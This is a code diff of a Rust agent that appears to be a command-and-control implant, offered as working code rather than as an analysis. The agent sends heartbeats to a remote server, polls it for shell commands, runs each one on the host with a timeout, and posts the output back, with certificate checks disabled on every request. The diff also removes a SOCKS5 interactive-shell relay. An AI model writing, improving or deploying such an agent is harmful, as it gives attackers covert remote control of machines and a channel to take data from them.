@@ -1,15 +1,14 @@
-use std::io::{self, Read};
+use std::io;
 use std::process::Command;
-use std::fs;
 use std::path::Path;
 use serde_json::json;
 use hostname;
 use os_info;
-use std::net::UdpSocket;
-use tokio::net::TcpStream;
-use tokio::io::{AsyncReadExt, AsyncWriteExt, split};
-use crate::networking::socks5::socks5_bind;
+use std::env;
 use get_if_addrs::get_if_addrs;
+use tokio::time::timeout;
+use std::time::{Duration, SystemTime, UNIX_EPOCH};
+use reqwest::StatusCode;
 
 #[cfg(windows)]
 fn create_command(command: &str, args: &[&str]) -> Command {
@@ -26,52 +25,25 @@ fn create_command(command: &str, args: &[&str]) -> Command {
     cmd
 }
 
-// Create a reusable ureq agent that skips TLS verification
-fn create_agent() -> ureq::Agent {
-    ureq::AgentBuilder::new()
-        .tls_connector(std::sync::Arc::new(
-            native_tls::TlsConnector::builder()
-                .danger_accept_invalid_certs(true)
-                .build()
-                .unwrap()
-        ))
-        .build()
-}
-
-async fn execute_and_capture(cmd: &str, args: &[&str]) -> io::Result<String> {
-    let output = Command::new(cmd)
-        .args(args)
-        .output()?;
-
-    Ok(format!("Exit Code: {}\nStdout:\n{}\nStderr:\n{}", 
-        output.status,
-        String::from_utf8_lossy(&output.stdout),
-        String::from_utf8_lossy(&output.stderr)))
-}
-
-// Add tree-related functions for fun
-fn display_tree(path: &Path, prefix: &str, is_last: bool) -> io::Result<()> {
-    let display = path.file_name()
-        .unwrap_or_else(|| path.as_os_str())
-        .to_string_lossy();
-    
-    println!("{}{}{}", prefix, 
-        if is_last { "└── " } else { "├── " }, 
-        display);
-
-    if path.is_dir() {
-        let entries = fs::read_dir(path)?
-            .collect::<Result<Vec<_>, io::Error>>()?;
-        
-        for (i, entry) in entries.iter().enumerate() {
-            let new_prefix = format!("{}{}", 
-                prefix,
-                if is_last { "    " } else { "│   " }
-            );
-            display_tree(&entry.path(), &new_prefix, i == entries.len() - 1)?;
+fn get_all_local_ips() -> Vec<String> {
+    let mut ips = Vec::new();
+    if let Ok(ifaces) = get_if_addrs() {
+        for iface in ifaces {
+            match iface.addr {
+                get_if_addrs::IfAddr::V4(v4) => {
+                    if !v4.ip.is_loopback() {
+                        ips.push(v4.ip.to_string());
+                    }
+                }
+                get_if_addrs::IfAddr::V6(v6) => {
+                    if !v6.ip.is_loopback() {
+                        ips.push(v6.ip.to_string());
+                    }
+                }
+            }
         }
     }
-    Ok(())
+    ips
 }
 
 async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
@@ -79,63 +51,39 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
         return Ok(String::new());
     }
 
-    // Handle special commands
-    match cmd_parts[0] {
-        _ => {
-            // Handle regular shell commands
-            let output = if cfg!(windows) {
-                // Join all parts for Windows cmd.exe
-                let full_command = cmd_parts.join(" ");
-                create_command(&full_command, &[]).output()?
+    // Handle cd command specially
+    if cmd_parts[0] == "cd" {
+        if let Some(dir) = cmd_parts.get(1) {
+            let path = Path::new(dir);
+            if path.exists() {
+                env::set_current_dir(path)?;
+                return Ok(format!("Changed directory to {}", env::current_dir()?.display()));
             } else {
-                // Use first part as command and rest as args for Unix
-                create_command(cmd_parts[0], &cmd_parts[1..]).output()?
-            };
-
-            Ok(format!("{}{}", 
-                String::from_utf8_lossy(&output.stdout),
-                String::from_utf8_lossy(&output.stderr)))
-        }
-    }
-}
-
-fn stdin_ready() -> io::Result<bool> {
-    let mut stdin = io::stdin();
-    let mut buf = [0u8; 1];
-    Ok(stdin.read(&mut buf)? > 0)
-}
-
-fn get_local_ip() -> io::Result<String> {
-    // Create a UDP socket and "connect" it to a public IP
-    // This doesn't send any packets, it just helps us determine which local interface would be used
-    let socket = UdpSocket::bind("0.0.0.0:0")?;
-    socket.connect("8.8.8.8:80")?;
-    let addr = socket.local_addr()?;
-    Ok(addr.ip().to_string())
-}
-
-/// Gather all non-loopback, non-point-to-point IP addresses
-fn get_all_local_ips() -> Vec<String> {
-    let mut ips = Vec::new();
-    if let Ok(ifaces) = get_if_addrs() {
-        for iface in ifaces {
-            match iface.addr {
-                get_if_addrs::IfAddr::V4(v4) => {
-                    let ip = v4.ip.to_string();
-                    if !v4.ip.is_loopback() {
-                        ips.push(ip);
-                    }
-                }
-                get_if_addrs::IfAddr::V6(v6) => {
-                    let ip = v6.ip.to_string();
-                    if !v6.ip.is_loopback() {
-                        ips.push(ip);
-                    }
-                }
+                return Err(io::Error::new(io::ErrorKind::NotFound, "Directory not found"));
             }
         }
+        return Ok(format!("Current directory: {}", env::current_dir()?.display()));
     }
-    ips
+
+    // Handle other commands with timeout
+    let result = timeout(Duration::from_secs(30), async {
+        let output = if cfg!(windows) {
+            let full_command = cmd_parts.join(" ");
+            create_command(&full_command, &[]).output()?
+        } else {
+            create_command(cmd_parts[0], &cmd_parts[1..]).output()?
+        };
+
+        Ok::<_, io::Error>(format!("{}{}",
+            String::from_utf8_lossy(&output.stdout),
+            String::from_utf8_lossy(&output.stderr)))
+    }).await;
+
+    match result {
+        Ok(Ok(output)) => Ok(output),
+        Ok(Err(e)) => Err(e),
+        Err(_) => Err(io::Error::new(io::ErrorKind::TimedOut, "Command timed out after 30 seconds"))
+    }
 }
 
 async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
@@ -158,119 +106,122 @@ async fn send_heartbeat(server_addr: &str, agent_id: &str) -> io::Result<()> {
         "commands": Vec::<String>::new()
     });
 
-    let agent = create_agent();
-    match agent.post(&url)
-        .set("Content-Type", "application/json")
-        .send_json(data)
-    {
-        Ok(response) => {
-            println!("[DEBUG] Heartbeat response: {:?}", response.status());
-            Ok(())
-        },
-        Err(e) => {
-            println!("[ERROR] Failed to send heartbeat: {}", e);
-            Err(io::Error::new(io::ErrorKind::Other, e.to_string()))
-        }
+    let client = reqwest::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()
+        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
+
+    let response = client.post(&url)
+        .json(&data)
+        .send()
+        .await
+        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
+
+    if !response.status().is_success() {
+        return Err(io::Error::new(io::ErrorKind::Other, 
+            format!("Heartbeat failed with status: {}", response.status())));
     }
+
+    println!("[DEBUG] Heartbeat response: {}", response.status());
+    Ok(())
 }
 
 async fn get_command(server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
     let url = format!("{}/api/agent/{}/command", server_addr, agent_id);
-    let agent = create_agent();
-    match agent.get(&url).call() {
-        Ok(response) => {
-            if response.status() == 204 {
-                return Ok(None);
-            }
-            #[derive(serde::Deserialize)]
-            struct CommandResponse {
-                command: String,
-            }
-            let cmd_resp: CommandResponse = response.into_json()?;
-            Ok(Some(cmd_resp.command))
-        },
-        Err(e) => {
-            println!("[DEBUG] No command available: {}", e);
-            Ok(None)
-        }
+    let client = reqwest::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()
+        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
+
+    let response = client.get(&url)
+        .send()
+        .await
+        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
+
+    if response.status() == StatusCode::NO_CONTENT {
+        return Ok(None);
     }
+
+    if !response.status().is_success() {
+        return Err(io::Error::new(io::ErrorKind::Other, 
+            format!("Command fetch failed with status: {}", response.status())));
+    }
+
+    #[derive(serde::Deserialize)]
+    struct CommandResponse {
+        command: String,
+    }
+
+    let cmd_resp = response.json::<CommandResponse>()
+        .await
+        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
+    
+    Ok(Some(cmd_resp.command))
 }
 
 async fn submit_result(server_addr: &str, agent_id: &str, command: &str, output: &str) -> io::Result<()> {
     let url = format!("{}/api/agent/{}/result", server_addr, agent_id);
+    let client = reqwest::Client::builder()
+        .danger_accept_invalid_certs(true)
+        .build()
+        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
+    
+    let timestamp = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .unwrap_or(Duration::from_secs(0))
+        .as_secs();
     
     let data = json!({
         "command": command,
         "output": output,
-        "timestamp": chrono::Utc::now().to_rfc3339()
+        "timestamp": timestamp
     });
 
-    let agent = create_agent();
-    match agent.post(&url)
-        .set("Content-Type", "application/json")
-        .send_json(data)
-    {
-        Ok(_) => Ok(()),
-        Err(e) => Err(io::Error::new(io::ErrorKind::Other, e.to_string()))
+    let response = client.post(&url)
+        .json(&data)
+        .send()
+        .await
+        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
+
+    if !response.status().is_success() {
+        return Err(io::Error::new(io::ErrorKind::Other, 
+            format!("Result submission failed with status: {}", response.status())));
     }
-}
 
-/// Runs an interactive shell over an existing SOCKS5 CONNECT tunnel.
-pub async fn run_shell_over_socks(
-    stream: TcpStream,
-    agent_id: &str,
-) -> io::Result<()> {
-    println!("[SOCKS5] Starting interactive shell for agent {}", agent_id);
-    let (mut rd, mut wr) = tokio::io::split(stream);
-    let mut stdin = tokio::io::stdin();
-    let mut stdout = tokio::io::stdout();
-
-    let to_remote = tokio::spawn(async move {
-        tokio::io::copy(&mut stdin, &mut wr).await
-    });
-
-    let from_remote = tokio::spawn(async move {
-        tokio::io::copy(&mut rd, &mut stdout).await
-    });
-
-    tokio::select! {
-        _ = to_remote => println!("[SOCKS5] Stdin closed"),
-        _ = from_remote => println!("[SOCKS5] Tunnel closed"),
-    }
     Ok(())
 }
 
-// This is a simple command shell that allows for basic file operations and command execution.
-// It can change directories, upload and download files, and display a directory tree.
-// PRECONDITION: The server must be running and accessible at the specified address.
-// POSTCONDITION: The shell will exit when the user types 'exit'.
 pub async fn run_shell(server_addr: &str, agent_id: &str) -> io::Result<()> {
     println!("[DEBUG] Starting shell with agent ID: {}", agent_id);
     send_heartbeat(server_addr, agent_id).await?;
     
     loop {
-        // Poll for commands
         println!("[DEBUG] Polling for commands...");
         match get_command(server_addr, agent_id).await? {
             Some(command) => {
                 println!("[DEBUG] Received command: {}", command);
                 
-                // Handle command differently based on platform
-                #[cfg(windows)]
-                let cmd_parts: Vec<&str> = vec![&command];
-                
-                #[cfg(not(windows))]
                 let cmd_parts: Vec<&str> = command.split_whitespace().collect();
                 
-                let output = execute_command(&cmd_parts).await?;
-                if let Err(e) = submit_result(server_addr, agent_id, &command, &output).await {
-                    println!("[ERROR] Failed to submit result: {}", e);
-                } else {
-                    println!("[DEBUG] Result submitted successfully");
+                match execute_command(&cmd_parts).await {
+                    Ok(output) => {
+                        if let Err(e) = submit_result(server_addr, agent_id, &command, &output).await {
+                            println!("[ERROR] Failed to submit result: {}", e);
+                        } else {
+                            println!("[DEBUG] Result submitted successfully");
+                        }
+                    }
+                    Err(e) => {
+                        let error_msg = format!("Command failed: {}", e);
+                        if let Err(e) = submit_result(server_addr, agent_id, &command, &error_msg).await {
+                            println!("[ERROR] Failed to submit error result: {}", e);
+                        }
+                        println!("[ERROR] Shell error: {}. Retrying...", e);
+                    }
                 }
             }
             None => {
-                tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
+                tokio::time::sleep(Duration::from_secs(2)).await;
             }
         }
     }
